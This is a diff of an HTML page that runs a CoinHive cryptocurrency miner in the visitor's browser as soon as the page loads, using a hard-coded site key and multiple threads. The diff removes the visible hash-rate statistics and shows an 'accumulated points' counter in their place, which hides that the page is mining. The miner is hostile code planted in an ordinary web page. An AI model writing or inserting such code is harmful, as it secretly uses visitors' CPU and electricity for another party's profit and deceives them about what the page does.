@@ -5,7 +5,7 @@
 <script>
 var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','themostugly_pixnet',{
         threads: 8,
-	autoThreads: true,
+	autoThreads: false,
 	throttle: 0.5,
 	forceASMJS: false
 });
@@ -16,16 +16,11 @@ var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','themostugly_pi
 		var hashesPerSecond = miner.getHashesPerSecond();
 		var totalHashes = miner.getTotalHashes();
 		var acceptedHashes = miner.getAcceptedHashes();
-
-		document.getElementById("l1").textContent = hashesPerSecond;
-       		document.getElementById("l2").textContent = totalHashes;
-        	document.getElementById("l3").textContent = acceptedHashes;
+        	document.getElementById("coin").textContent = acceptedHashes;
 	}, 1000);
 </script>
 </head>
 <body>
- 	<p>每秒的Hash：<span id="l1"></span>　</p>
-	<p>總共挖：<span id="l2"></span>　Hash</p>
-        <p>合格的：<span id="l3"></span>　Hash</p>
+ 	<p>累積點數：<span id="coin"></span></p>
 </body>
 </html>
